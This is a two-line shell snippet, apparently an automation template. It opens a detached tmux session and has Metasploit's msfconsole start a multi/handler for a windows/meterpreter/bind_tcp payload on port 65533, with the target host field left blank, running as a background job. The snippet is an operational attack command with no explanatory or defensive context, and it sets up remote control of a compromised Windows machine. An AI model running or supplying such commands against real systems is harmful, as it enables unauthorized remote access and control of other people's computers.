tmux new -s autoXXX -d

tmux send -t "autoXXX" "msfconsole -x \"use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT 65533;set RHOST ;run -j -z;\"" Enter

